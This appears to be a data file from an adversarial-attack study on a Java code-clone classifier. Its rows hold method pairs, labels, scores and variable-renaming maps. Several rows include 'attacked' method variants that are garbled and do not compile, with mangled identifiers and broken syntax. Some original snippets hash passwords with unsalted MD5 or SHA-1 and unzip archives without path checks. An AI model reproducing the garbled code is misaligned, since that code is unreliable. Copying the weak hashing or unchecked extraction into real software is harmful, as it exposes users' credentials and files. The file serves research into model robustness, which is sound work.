                treeData[i][1] = new String(DOMUtil.getSimpleElementText((Element) nodelist.item(i), ""ppid""));
                treeData[i][2] = new String(DOMUtil.getSimpleElementText((Element) nodelist.item(i), ""p""));
            }
        } catch (MalformedURLException ex) {
            System.out.println(ex);
        } catch (ParserConfigurationException ex) {
            System.out.println(ex);
        } catch (NullPointerException e) {
        } catch (Exception ex) {
            System.out.println(ex);
        }
        return treeData;
    }
",391,,LABEL_1,LABEL_1,LABEL_1,-1,"genCustRatingFileAndMovieIndexFile,completePath,masterFile,CustRatingFileName,MovieIndexFileName,inFile,inC,outFile1,outC1,outFile2,outC2,fileSize,totalNoDataRows,mappedBuffer,startIndex,count,currentMovie,movieName,customer,rating,outBuf1,outBuf2,endOfIndexFile",,,,0,,0,GA,8444,3.2923267126083373,failed,[]
281,"    public static String encrypt(String plainText) {
        if (TextUtils.isEmpty(plainText)) {
            plainText = """";
        }
        StringBuilder text = new StringBuilder();
        for (int i = plainText.length() - 1; i >= 0; i--) {
            text.append(plainText.charAt(i));
        }
        plainText = text.toString();
        MessageDigest mDigest;
        try {
            mDigest = MessageDigest.getInstance(""SHA-256"");
        } catch (NoSuchAlgorithmException e) {
            return plainText;
        }
        mDigest.update(plainText.getBytes());
        byte d[] = mDigest.digest();
        StringBuffer hash = new StringBuffer();
        for (int i = 0; i < d.length; i++) {
            hash.append(Integer.toHexString(0xFF & d[i]));
        }
        return hash.toString();
    }
 <SPLIT>     public void init(ConnectionManager mgr, Hashtable cfg, Socket sock) throws RemoteException {
        _cman = mgr;
        _sock = sock;
        for (int i = 0; i < 256; i++) {
            String key = Integer.toHexString(i);
            if (key.length() < 2) key = ""0"" + key;
            availcmd.push(key);
            commands.put(key, null);
        }
        try {
            _sout = new PrintWriter(_sock.getOutputStream(), true);
            _sinp = new BufferedReader(new InputStreamReader(_sock.getInputStream()));
            String seed = """";
            Random rand = new Random();
            for (int i = 0; i < 16; i++) {
                String hex = Integer.toHexString(rand.nextInt(256));
                if (hex.length() < 2) hex = ""0"" + hex;
                seed += hex.substring(hex.length() - 2);
            }
            String pass = _mpsw + seed + _spsw;
            MessageDigest md5 = MessageDigest.getInstance(""MD5"");
            md5.reset();
            md5.update(pass.getBytes());
            String hash = hash2hex(md5.digest()).toLowerCase();
            String banner = ""INIT "" + ""servername"" + "" "" + hash + "" "" + seed;
            sendLine(banner);
            String txt = readLine(5);
            if (txt == null) {
                throw new IOException(""Slave did not send banner !!"");
            }
            String sname = """";
            String spass = """";
            String sseed = """";
            try {
                String[] items = txt.split("" "");
                sname = items[1].trim();
                spass = items[2].trim();
                sseed = items[3].trim();
            } catch (Exception e) {
                AsyncSlaveListener.invalidSlave(""INITFAIL BadKey"", _sock);
            }
            pass = _spsw + sseed + _mpsw;
            md5 = MessageDigest.getInstance(""MD5"");
            md5.reset();
            md5.update(pass.getBytes());
            hash = hash2hex(md5.digest()).toLowerCase();
            if (!sname.equals(_name)) {
                AsyncSlaveListener.invalidSlave(""INITFAIL Unknown"", _sock);
            }
            if (!spass.toLowerCase().equals(hash.toLowerCase())) {
                AsyncSlaveListener.invalidSlave(""INITFAIL BadKey"", _sock);
            }
            _cman.getSlaveManager().addSlave(_name, this, getSlaveStatus(), -1);
            start();
        } catch (IOException e) {
            if (e instanceof ConnectIOException && e.getCause() instanceof EOFException) {
                logger.info(""Check slaves.xml on the master that you are allowed to connect."");
            }
            logger.info(""IOException: "" + e.toString());
            try {
                sock.close();
            } catch (Exception e1) {
            }
        } catch (Exception e) {
            logger.warn(""Exception: "" + e.toString());
            try {
                sock.close();
            } catch (Exception e2) {
            }
        }
        System.gc();
    }
",176,,LABEL_1,LABEL_1,LABEL_1,-1,"encrypt,plainText,text,i,mDigest,d,hash",,,,0,,0,GA,2430,0.9112009723981221,failed,[]
282,"    static String encrypt(String plaintext) {
        MessageDigest d = null;
        try {
            d = MessageDigest.getInstance(""SHA-1"");
            d.update(plaintext.getBytes(""UTF-8""));
        } catch (Exception e) {
            e.printStackTrace();
        }
        return new String(Base64.encodeBase64(d.digest()));
    }
 <SPLIT>     public String downloadAndOpen(JProgressBar bar) {
        long size = 0;
        try {
            size = photo.getSize();
        } catch (ServiceException ex) {
            ex.printStackTrace();
        }
        try {
            bar.setMaximum((int) size);
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        bar.setValue(0);
        image = new File(""TMP/"" + photo.getTitle().getPlainText());
        try {
            if (!image.exists()) {
                image.createNewFile();
                image.deleteOnExit();
                URL url = null;
                BufferedOutputStream fOut = null;
                try {
                    url = new URL(photo.getMediaContents().get(0).getUrl());
                    InputStream html = null;
                    html = url.openStream();
                    fOut = new BufferedOutputStream(new FileOutputStream(image));
                    byte[] buffer = new byte[32 * 1024];
                    int bytesRead = 0;
                    int in = 0;
                    while ((bytesRead = html.read(buffer)) != -1) {
                        in += bytesRead;
                        bar.setValue(in);
                        fOut.write(buffer, 0, bytesRead);
                    }
                    html.close();
                    fOut.close();
                } catch (Exception ex) {
                    ex.printStackTrace();
                }
            }
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        return image.getAbsolutePath();
    }
",72,,LABEL_0,LABEL_0,LABEL_0,-1,"encrypt,plaintext,d",,,,0,,0,GA,1069,0.3821471095085144,failed,[]
283,"        public void run() {
            try {
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod(""GET"");
                con.setDoInput(true);
                byte[] encodedPassword = (username + "":"" + password).getBytes();
                BASE64Encoder encoder = new BASE64Encoder();
                con.setRequestProperty(""Authorization"", ""Basic "" + encoder.encode(encodedPassword));
                BufferedInputStream in = new BufferedInputStream(con.getInputStream());
                FileOutputStream fos = new FileOutputStream(toFile);
                BufferedOutputStream bout = new BufferedOutputStream(fos, 1024);
                byte[] data = new byte[1024];
                int x = 0;
                while ((x = in.read(data, 0, 1024)) >= 0) {
                    bout.write(data, 0, x);
                    lastIteraction = System.currentTimeMillis();
                }
                bout.flush();
                bout.close();
                fos.flush();
                fos.close();
                in.close();
                con.disconnect();
                finish = true;
            } catch (Exception e) {
                this.e = e;
            }
        }
 <SPLIT>     private static void downloadImages(String uriPrefix, String fileWithListOfImages, String outputDir) throws Exception {
        Properties list = new Properties();
        list.load(new FileInputStream(fileWithListOfImages));
        long current = 0;
        long startTime = System.currentTimeMillis();
        System.out.println(""Downloading files from "" + uriPrefix + "" to "" + outputDir);
        System.out.println(""Total "" + list.size() + "" files, think of 1 sec per file"");
        System.out.println(""Images with the same size as the 'no-image' image are ignored and not displayed"");
        for (Iterator<Object> it = list.keySet().iterator(); it.hasNext(); ) {
            String urlString = it.next().toString().replace('\\', '/');
            if (urlString.contains(""="")) throw new Exception(""Symbol '=' found in file names, while it is reserved for denoting '/' in flat-file names"");
        }
        for (Iterator<Object> it = list.keySet().iterator(); it.hasNext(); ) {
            String urlString = it.next().toString().replace('\\', '/');
            URL url = new URL(uriPrefix + urlString);
            File file = new File(outputDir + ""/"" + imageNameToFileName(urlString));
            current++;
            if (!file.exists()) {
                try {
                    BufferedInputStream in = new BufferedInputStream(url.openStream(), 64000);
                    BufferedOutputStream out = new BufferedOutputStream(new FileOutputStream(file), 64000);
                    int c;
                    while ((c = in.read()) != -1) {
                        out.write(c);
                    }
                    out.close();
                    in.close();
                    System.out.print(current + "" /"" + list.size() + "". "" + file.getName() + "", "");
                    System.out.println(""saved"");
                } catch (Exception e) {
                    System.out.print(current + "" /"" + list.size() + "". "" + file.getName() + "", FAILED, error: "" + e.getMessage());
                }
            } else {
                System.out.print(current + "" /"" + list.size() + "". "" + file.getName() + "", "");
                System.out.println(""already exists"");
            }
            if (current / 100 == current / 100.0) {
                long delta = (System.currentTimeMillis() - startTime);
                System.out.println(""Total time "" + delta + "" ms, "" + (delta / current) + "" ms/file"");
            }
        }
        long delta = (System.currentTimeMillis() - startTime);
        System.out.println(""Total time "" + delta + "" ms, "" + (delta / list.size()) + "" ms/file"");
    }
",228,,LABEL_0,LABEL_0,LABEL_0,-1,"run,con,encodedPassword,encoder,in,fos,bout,data,x,lastIteraction,e",,,,0,,0,GA,4027,1.5167455156644185,failed,[]
284,"    public static void unzipModel(String filename, String tempdir) throws EDITSException {
        try {
            BufferedOutputStream dest = null;
            FileInputStream fis = new FileInputStream(filename);
            int BUFFER = 2048;
            ZipInputStream zis = new ZipInputStream(new BufferedInputStream(fis));
            ZipEntry entry;
            while ((entry = zis.getNextEntry()) != null) {
                int count;
                byte data[] = new byte[BUFFER];
                FileOutputStream fos = new FileOutputStream(tempdir + entry.getName());
                dest = new BufferedOutputStream(fos, BUFFER);
                while ((count = zis.read(data, 0, BUFFER)) != -1) dest.write(data, 0, count);
                dest.flush();
                dest.close();
            }
            zis.close();
        } catch (Exception e) {
            throw new EDITSException(""Can not expand model in \"""" + tempdir + ""\"" because:\n"" + e.getMessage());
        }
    }
 <SPLIT>     private static void copyFiles(String strPath, String dstPath) throws Exception {
        File src = new File(strPath);
        File dest = new File(dstPath);
        if (src.isDirectory()) {
            dest.mkdirs();
            String list[] = src.list();
            for (int i = 0; i < list.length; i++) {
                String dest1 = dest.getAbsolutePath() + ""\\"" + list[i];
                String src1 = src.getAbsolutePath() + ""\\"" + list[i];
                copyFiles(src1, dest1);
            }
        } else {
            FileChannel sourceChannel = new FileInputStream(src).getChannel();
            FileChannel targetChannel = new FileOutputStream(dest).getChannel();
            sourceChannel.transferTo(0, sourceChannel.size(), targetChannel);
            sourceChannel.close();
            targetChannel.close();
        }
    }
",188,"    public static void unzipModel(String url, String tempdir) throws EDITSException {
        try {
            BufferedOutputStream dc = null;
            FileInputStflism fis = new FileInputStream(url);
            int  BUVEN = 2048;
            ZipInputStream zzipIS= new ZipInputStream(new BufferedInputStream(flis));
            ZipEntry entry;
            while ((enentry zipIS.getNextEntry()) != null) {
                int len;
                byte data[] = new byte[ BUVEN];
                FileOutputStream dfoes = new FileOutputStream(tempdir + entry.getName());
                dc = new BufferedOutputStream(dfoes,  BUVEN);
                while ((len zipISis.rdatadata, 0 BUVENER)) != -1) dc.writdatata, 0, len);
                dc.flush();
                dc.close();
            }
            zipIS.close();
        } catch (Exception e) {
            throw new EDITSException(""Can not expand model in \"""" + tempdir + ""\"" because:
"" + e.getMessage());
        }
    }
",LABEL_1,LABEL_1,0.59499192237854,1,"unzipModel,filename,tempdir,dest,fis,BUFFER,zis,entry,count,data,fos",,,,10,"unzipModel:unzipModel,filename:url,tempdir:tempdir,dest:dc,fis:flis,BUFFER: BUVEN,zis:zipIS,entry:entry,count:len,data:data,fos:dfoes,",4,GA,558,0.20279077291488648,ga,[]
285,"    public boolean import_hints(String filename) {
        int pieceId;
        int i, col, row;
        int rotation;
        int number;
        boolean byurl = true;
        e2piece temppiece;
        String lineread;
        StringTokenizer tok;
        BufferedReader entree;
        try {
            if (byurl == true) {
                URL url = new URL(baseURL, filename);
                InputStream in = url.openStream();
                entree = new BufferedReader(new InputStreamReader(in));
            } else {
                entree = new BufferedReader(new FileReader(filename));
            }
            pieceId = 0;
            lineread = entree.readLine();
            tok = new StringTokenizer(lineread, "" "");
            number = Integer.parseInt(tok.nextToken());
            for (i = 0; i < number; i++) {
                lineread = entree.readLine();
                if (lineread == null) {
                    break;
                }
                tok = new StringTokenizer(lineread, "" "");
                pieceId = Integer.parseInt(tok.nextToken());
                col = Integer.parseInt(tok.nextToken()) - 1;
                row = Integer.parseInt(tok.nextToken()) - 1;
                rotation = Integer.parseInt(tok.nextToken());
                System.out.println(""placing hint piece : "" + pieceId);
                place_piece_at(pieceId, col, row, 0);
                temppiece = board.get_piece_at(col, row);
                temppiece.reset_rotation();
                temppiece.rotate(rotation);
                temppiece.set_as_hint();
            }
            return true;
        } catch (IOException err) {
            return false;
        }
    }
 <SPLIT>     public static ArrayList<String> loadURLToStrings(URL url, int maxLines, String userAgent, int timeout) throws IOException {
        URLConnection connection = url.openConnection();
        if (userAgent != null && userAgent.trim().length() > 0) {
            connection.setRequestProperty(""User-Agent"", userAgent);
        } else {
            connection.setRequestProperty(""User-Agent"", ""Mozilla/5.0 (compatible; astrominer/1.0;)"");
        }
        if (timeout > 0) {
            connection.setConnectTimeout(timeout);
        }
        connection.connect();
        return loadURLToStrings(connection, maxLines);
    }
",306,,LABEL_0,LABEL_0,LABEL_0,-1,"import_hints,filename,pieceId,i,col,row,rotation,number,temppiece,lineread,tok,entree,byurl,url,in",,,,0,,0,GA,5623,2.0559627334276835,failed,[]
286,"    public static String encodePassword(String _originalPassword) {
        MessageDigest md = null;
        String encodedPassword = null;
        try {
            md = MessageDigest.getInstance(""SHA-1"");
            md.update(_originalPassword.getBytes(""UTF-8""));
            encodedPassword = (new BASE64Encoder()).encode(md.digest());
        } catch (NoSuchAlgorithmException _e) {
            _e.printStackTrace();
        } catch (UnsupportedEncodingException _e) {
            _e.printStackTrace();
        }
        return encodedPassword;
    }
 <SPLIT>     public static String mysqlPasswordHash(String string) {
        try {
            MessageDigest digest = MessageDigest.getInstance(HashAlgorithms.SHA1);
            try {
                digest.update(string.getBytes(""UTF-8""));
            } catch (UnsupportedEncodingException e) {
                throw new RuntimeException(e);
            }
            byte[] encodedPassword = digest.digest();
            digest.update(encodedPassword);
            encodedPassword = digest.digest();
            String hash = new BigInteger(1, encodedPassword).toString(16).toUpperCase();
            while (hash.length() < 40) {
                hash = ""0"" + hash;
            }
            return ""*"" + hash;
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
    }
",96,,LABEL_1,LABEL_1,LABEL_1,-1,"encodePassword,_originalPassword,md,encodedPassword",,,,0,,0,GA,1384,0.491457990805308,failed,[]
287,"    public void updateUser(final User user) throws IOException {
        try {
            Connection conn = null;
            boolean autoCommit = false;
            try {
                conn = pool.getConnection();
                autoCommit = conn.getAutoCommit();
                conn.setAutoCommit(false);
                final PreparedStatement updateUser = conn.prepareStatement(""update users set mainRoleId=? where userId=?"");
                updateUser.setInt(1, user.getMainRole().getId());
                updateUser.setString(2, user.getUserId());
                updateUser.executeUpdate();
                final PreparedStatement deleteRoles = conn.prepareStatement(""delete from userRoles where userId=?"");
                deleteRoles.setString(1, user.getUserId());
                deleteRoles.executeUpdate();
                final PreparedStatement insertRoles = conn.prepareStatement(""insert into userRoles (userId, roleId) values (?,?)"");
                for (final Role role : user.getRoles()) {
                    insertRoles.setString(1, user.getUserId());
                    insertRoles.setInt(2, role.getId());
                    insertRoles.executeUpdate();
                }
                conn.commit();
            } catch (Throwable t) {
                if (conn != null) conn.rollback();
                throw new SQLException(t.toString());
            } finally {
                if (conn != null) {
                    conn.setAutoCommit(autoCommit);
                    conn.close();
                }
            }
        } catch (final SQLException sqle) {
            log.log(Level.SEVERE, sqle.toString(), sqle);
            throw new IOException(sqle.toString());
        }
    }
 <SPLIT>     public boolean clonarFichero(FileInputStream rutaFicheroOrigen, String rutaFicheroDestino) {
        System.out.println("""");
        boolean estado = false;
        try {
            FileOutputStream salida = new FileOutputStream(rutaFicheroDestino);
            FileChannel canalOrigen = rutaFicheroOrigen.getChannel();
            FileChannel canalDestino = salida.getChannel();
            canalOrigen.transferTo(0, canalOrigen.size(), canalDestino);
            rutaFicheroOrigen.close();
            salida.close();
            estado = true;
        } catch (IOException e) {
            System.out.println(""No se encontro el archivo"");
            e.printStackTrace();
            estado = false;
        }
        return estado;
    }
",288,,LABEL_0,LABEL_0,LABEL_0,-1,"updateUser,user,conn,autoCommit,deleteRoles,insertRoles,role",,,,0,,0,GA,2670,0.97534685532252,failed,[]
288,"    public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
 <SPLIT>     public static void copyFile(File in, File out) {
        try {
            FileChannel inChannel = null, outChannel = null;
            try {
                out.getParentFile().mkdirs();
                inChannel = new FileInputStream(in).getChannel();
                outChannel = new FileOutputStream(out).getChannel();
                outChannel.transferFrom(inChannel, 0, inChannel.size());
            } finally {
                if (inChannel != null) {
                    inChannel.close();
                }
                if (outChannel != null) {
                    outChannel.close();
                }
            }
        } catch (Exception e) {
            ObjectUtils.throwAsError(e);
        }
    }
",194,"    public static boolean decodeFileToFile(String infiles, String  outdatabase) {
        boolean comment = false;
        java.io.InputStream thin = null;
        java.io.OutputStream writer = null;
        try {
            ithin= new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infiles)), Base64.DECODE);
            out =writerw java.io.BufferedOutputStream(new java.io.FileOutputStream( outdatabase));
            byte[] url = new byte[65536];
            int r = -1;
            while (rd = thread(url)) >= 0) {
                writer.write(url, 0, r);
            }
            comment = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                thin.close();
            } catch (Exception exc) {
            }
            try {
                writer.close();
            } catch (Exception exc) {
            }
        }
        return comment;
    }
",LABEL_1,LABEL_1,0.6287084817886353,1,"decodeFileToFile,infile,outfile,in,out,buffer,read,success",,,,1,"decodeFileToFile:decodeFileToFile,infile:infiles,outfile: outdatabase,in:thin,out:writer,buffer:url,read:r,success:comment,",1,GA,453,0.16350990136464436,ga,[]
289,"    private String encryptPassword(String password) throws NoSuchAlgorithmException {
        StringBuffer encryptedPassword = new StringBuffer();
        MessageDigest md5 = MessageDigest.getInstance(""MD5"");
        md5.reset();
        md5.update(password.getBytes());
        byte digest[] = md5.digest();
        for (int i = 0; i < digest.length; i++) {
            String hex = Integer.toHexString(0xFF & digest[i]);
            if (hex.length() == 1) {
                encryptedPassword.append('0');
            }
            encryptedPassword.append(hex);
        }
        return encryptedPassword.toString();
    }
 <SPLIT>     public static String md5String(String str) {
        try {
            MessageDigest md;
            md = MessageDigest.getInstance(""MD5"");
            md.update(str.getBytes());
            byte[] hash = md.digest();
            final char[] hexChars = { '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f' };
            StringBuffer res = new StringBuffer();
            for (int i = 0; i < hash.length; i++) {
                res.append(hexChars[(0xF0 & hash[i]) >> 4]);
                res.append(hexChars[0x0F & hash[i]]);
            }
            return res.toString();
        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
            return null;
        }
    }
",127,,LABEL_1,LABEL_1,LABEL_1,-1,"encryptPassword,password,encryptedPassword,md5,digest,i,hex",,,,0,,0,GA,2295,0.8213950236638387,failed,[]
290,"    private InputStream openStreamRaw(String filename) {
        InputStream stream = null;
        if (filename == null) return null;
        if (filename.length() == 0) {
            return null;
        }
        try {
            URL url = new URL(filename);
            stream = url.openStream();
            return stream;
        } catch (MalformedURLException mfue) {
        } catch (FileNotFoundException fnfe) {
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
        ClassLoader cl = getClass().getClassLoader();
        stream = cl.getResourceAsStream(""data/"" + filename);
        if (stream != null) {
            String cn = stream.getClass().getName();
            if (!cn.equals(""sun.plugin.cache.EmptyInputStream"")) {
                return stream;
            }
        }
        stream = cl.getResourceAsStream(filename);
        if (stream != null) {
            String cn = stream.getClass().getName();
            if (!cn.equals(""sun.plugin.cache.EmptyInputStream"")) {
                return stream;
            }
        }
        return stream;
    }
 <SPLIT>     @Override
    public User saveUser(User user) {
        try {
            MessageDigest digest = java.security.MessageDigest.getInstance(""MD5"");
            digest.update(user.getPassword().getBytes(""UTF-8""));
            byte[] hash = digest.digest();
            BigInteger bigInt = new BigInteger(1, hash);
            String hashtext = bigInt.toString(16);
            while (hashtext.length() < 32) {
                hashtext = ""0"" + hashtext;
            }
            user.setPassword(hashtext);
            user.setDataRegjistrimit(new Date());
            return em.merge(user);
        } catch (Exception e) {
            throw new NestedException(e.getMessage(), e);
        }
    }
",204,,LABEL_0,LABEL_0,LABEL_0,-1,"openStreamRaw,filename,stream,url,cl,cn",,,,0,,0,GA,1937,0.7005815029144287,failed,[]
291,"    public void modifyApplicationMessage(String locale, String messageName, String messageValue) {
        Properties properties = new Properties();
        try {
            String i18nPath = ServerUtil.removelastResourceURL(ConfigurationServiceImpl.class.getResource(""/es/ua/tranube/prototype/main/client/TranubeConstants_en.properties"").getPath()).toString();
            File englishFile = new File(i18nPath + ""TranubeConstants_en.properties"");
            if (!englishFile.exists()) throw new Exception(""English file not found"");
            String propertiesFilePath = i18nPath + ""TranubeConstants_"" + locale + "".properties"";
            File file = new File(propertiesFilePath);
            if (!file.exists()) {
                FileReader in = new FileReader(englishFile);
                FileWriter out = new FileWriter(file);
                int c;
                while ((c = in.read()) != -1) out.write(c);
                in.close();
                out.close();
            }
            InputStream is = ConfigurationServiceImpl.class.getResourceAsStream(""/es/ua/tranube/prototype/main/client/TranubeConstants_"" + locale + "".properties"");
            BufferedReader breader = new BufferedReader(new InputStreamReader(is));
            String line = null;
            StringBuilder strBuilder = new StringBuilder();
            boolean found = false;
            while ((line = breader.readLine()) != null) {
                if (line.startsWith(""#"")) strBuilder.append(line).append(""\n""); else {
                    String[] pieces = line.split(""="");
                    if (pieces.length == 2) {
                        if (pieces[0].trim().equals(messageName)) {
                            strBuilder.append(pieces[0].trim() + "" = "" + messageValue + ""\n"");
                            found = true;
                        } else strBuilder.append(line).append(""\n"");
                    } else strBuilder.append(line).append(""\n"");
                }
            }
            if (!found) strBuilder.append(messageName).append("" = "").append(messageValue).append(""\n"");
            breader.close();
            is.close();
            FileWriter writer = new FileWriter(file);
            writer.write(strBuilder.toString());
            writer.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
 <SPLIT>     private String transferWSDL(String wsdlURL, String userPassword) throws WiseConnectionException {
        String filePath = null;
        try {
            URL endpoint = new URL(wsdlURL);
            HttpURLConnection conn = (HttpURLConnection) endpoint.openConnection();
            conn.setDoOutput(false);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            conn.setRequestMethod(""GET"");
            conn.setRequestProperty(""Accept"", ""text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"");
            conn.setRequestProperty(""Connection"", ""close"");
            if (userPassword != null) {
                conn.setRequestProperty(""Authorization"", ""Basic "" + (new BASE64Encoder()).encode(userPassword.getBytes()));
            }
            InputStream is = null;
            if (conn.getResponseCode() == 200) {
                is = conn.getInputStream();
            } else {
                is = conn.getErrorStream();
                InputStreamReader isr = new InputStreamReader(is);
                StringWriter sw = new StringWriter();
                char[] buf = new char[200];
                int read = 0;
                while (read != -1) {
                    read = isr.read(buf);
                    sw.write(buf);
                }
                throw new WiseConnectionException(""Remote server's response is an error: "" + sw.toString());
            }
            File outputDir = new File(wiseProperties.getProperty(""wise.tmpDir""));
            if (!outputDir.exists()) {
                outputDir.mkdir();
                wiseProperties.setProperty(""wise.forceImportObject"", ""true"");
            }
            File file = new File(wiseProperties.getProperty(""wise.tmpDir""), new StringBuffer(""Wise"").append(IDGenerator.nextVal()).append("".xml"").toString());
            OutputStream fos = new BufferedOutputStream(new FileOutputStream(file));
            IOUtils.copyStream(fos, is);
            fos.close();
            is.close();
            filePath = file.getPath();
        } catch (WiseConnectionException wce) {
            throw wce;
        } catch (Exception e) {
            throw new WiseConnectionException(""Wsdl download failed!"", e);
        }
        return filePath;
    }
",452,"    public void modifyApplicationMessage(String Locales, String messageName, String messageValue) {
        Properties properties = new Properties();
        try {
            String i18nPath = ServerUtil.removelastResourceURL(ConfigurationServiceImpl.class.getResource(""/es/ua/tranube/prototype/main/client/TranubeConstants_en.properties"").getPath()).toString();
            File englishFile = new File(i18nPath + ""TranubeConstants_en.properties"");
            if (!englishFile.exists()) throw new Exception(""English file not found"");
            String ppropertiesFilePath= ii18nPath+ ""TranubeConstants_"" + Locales + "".properties"";
            File url = new File(propertiesFilePath);
            if (!url.exists()) {
                FileReader in = new FileReader(englishFile);
                FileWriteragaint = new FileWriter(url);
                int c;
                while ((c c in.read()) != -1) again.write(c);
                in.close();
                again.close();
            }
            InputStream iis= ConfigurationServiceImpl.class.getResourceAsStream(""/es/ua/tranube/prototype/main/client/TranubeConstants_"" + Locales + "".properties"");
            BufferedReader breader = new BufferedReader(new InputStreamReader(is));
            String line = null;
            StringBuilder StrBuffer = new StringBuilder();
            boolean found = false;
            while ((line = breader.readLine()) != null) {
                if (line.startsWith(""#"")) StrBuffer.append(line).append(""
""); else {
                    String[] pieces = line.split(""="");
                    if (pieces.length == 2) {
                        if (pieces[0].trim().equals(messageName)) {
                            StrBuffer.append(pieces[0].trim() + "" = "" + messageValue + ""
"");
                            found = true;
                        } else StrBuffer.append(line).append(""
"");
                    } else StrBuffer.append(line).append(""
"");
                }
            }
            if (foundd) StrBuffer.append(messageName).append("" = "").append(messageValue).append(""
"");
            breader.close();
            is.close();
            FileWriter writer = new FileWriter(url);
            writer.write(StrBuffer.toString());
            writer.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
",LABEL_1,LABEL_1,0.5244726538658142,1,"modifyApplicationMessage,locale,messageName,messageValue,properties,i18nPath,englishFile,propertiesFilePath,file,in,out,c,is,breader,line,strBuilder,pieces,found",,,,43,"modifyApplicationMessage:modifyApplicationMessage,locale:Locales,messageName:messageName,messageValue:messageValue,properties:properties,i18nPath:i18nPath,englishFile:englishFile,propertiesFilePath:propertiesFilePath,file:url,in:in,out:again,c:c,is:is,breader:breader,line:line,strBuilder:StrBuffer,pieces:pieces,found:found,",14,GA,861,0.3377873261769613,ga,[]
292,"    @Test
    public void testTrainingBackprop() throws IOException {
        File temp = File.createTempFile(""fannj_"", "".tmp"");
        temp.deleteOnExit();
        IOUtils.copy(this.getClass().getResourceAsStream(""xor.data""), new FileOutputStream(temp));
        List<Layer> layers = new ArrayList<Layer>();
        layers.add(Layer.create(2));
        layers.add(Layer.create(3, ActivationFunction.FANN_SIGMOID_SYMMETRIC));
        layers.add(Layer.create(2, ActivationFunction.FANN_SIGMOID_SYMMETRIC));
        layers.add(Layer.create(1, ActivationFunction.FANN_SIGMOID_SYMMETRIC));
        Fann fann = new Fann(layers);
        Trainer trainer = new Trainer(fann);
        trainer.setTrainingAlgorithm(TrainingAlgorithm.FANN_TRAIN_INCREMENTAL);
        float desiredError = .001f;
        float mse = trainer.train(temp.getPath(), 500000, 1000, desiredError);
        assertTrue("""" + mse, mse <= desiredError);
    }
 <SPLIT>     @Test
    public void testCopyUnknownSize() throws IOException {
        final InputStream in = new ByteArrayInputStream(TEST_DATA);
        final ByteArrayOutputStream out = new ByteArrayOutputStream(TEST_DATA.length);
        final int cpySize = ExtraIOUtils.copy(in, out, (-1));
        assertEquals(""Mismatched copy size"", TEST_DATA.length, cpySize);
        final byte[] outArray = out.toByteArray();
        assertArrayEquals(""Mismatched data"", TEST_DATA, outArray);
    }
",197,,LABEL_1,LABEL_1,LABEL_1,-1,"testTrainingBackprop,temp,layers,fann,trainer,desiredError,mse",,,,0,,0,GA,2432,0.8753831585248312,failed,[]
293,"    public void importarEmissoresDosTitulosFinanceiros(File pArquivoTXT, Andamento pAndamento) throws FileNotFoundException, SQLException {
        int numeroDoRegistro = -1;
        Scanner in = null;
        Statement stmtLimpezaInicialDestino = conDestino.createStatement();
        String sql = ""TRUNCATE TABLE TMP_TB_EMISSOR_TITULO"";
        stmtLimpezaInicialDestino.executeUpdate(sql);
        sql = ""INSERT INTO TMP_TB_EMISSOR_TITULO(SIGLA, NOME, CNPJ, DATA_CRIACAO) VALUES(:SIGLA, :NOME, :CNPJ, :DATA_CRIACAO)"";
        OraclePreparedStatement stmtDestino = (OraclePreparedStatement) conDestino.prepareStatement(sql);
        stmtDestino.setExecuteBatch(COMANDOS_POR_LOTE);
        final int TAMANHO_DO_CABECALHO_DO_ARQUIVO = 0;
        final int TAMANHO_DO_RODAPE_DO_ARQUIVO = 0;
        final int TAMANHO_DOS_METADADOS_DO_ARQUIVO = TAMANHO_DO_CABECALHO_DO_ARQUIVO + TAMANHO_DO_RODAPE_DO_ARQUIVO;
        final int TAMANHO_MEDIO_POR_REGISTRO = 81;
        long tamanhoDosArquivos = pArquivoTXT.length();
        int quantidadeDeRegistrosEstimada = (int) (tamanhoDosArquivos - TAMANHO_DOS_METADADOS_DO_ARQUIVO) / TAMANHO_MEDIO_POR_REGISTRO;
        String registro;
        String[] campos;
        try {
            in = new Scanner(new FileInputStream(pArquivoTXT), Constantes.CONJUNTO_DE_CARACTERES_DOS_ARQUIVOS_TEXTO_DA_BOVESPA.name());
            int quantidadeDeRegistrosImportada = 0;
            numeroDoRegistro = 0;
            String vSIGLA, vNOME;
            BigDecimal vCNPJ;
            java.sql.Date vDATA_CRIACAO;
            final int QTDE_CAMPOS = CampoDoArquivoDosEmissoresDeTitulosFinanceiros.values().length;
            final String SEPARADOR_DE_CAMPOS_DO_REGISTRO = "","";
            final String DELIMITADOR_DE_CAMPOS_DO_REGISTRO = ""\"""";
            while (in.hasNextLine()) {
                ++numeroDoRegistro;
                registro = in.nextLine();
                stmtDestino.clearParameters();
                registro = registro.substring(1, registro.length() - 1);
                if (registro.endsWith(DELIMITADOR_DE_CAMPOS_DO_REGISTRO)) {
                    registro = registro + "" "";
                }
                campos = registro.split(DELIMITADOR_DE_CAMPOS_DO_REGISTRO + SEPARADOR_DE_CAMPOS_DO_REGISTRO + DELIMITADOR_DE_CAMPOS_DO_REGISTRO);
                int quantidadeDeCamposEncontradosIncluindoOsVazios = campos.length;
                if (quantidadeDeCamposEncontradosIncluindoOsVazios != QTDE_CAMPOS) {
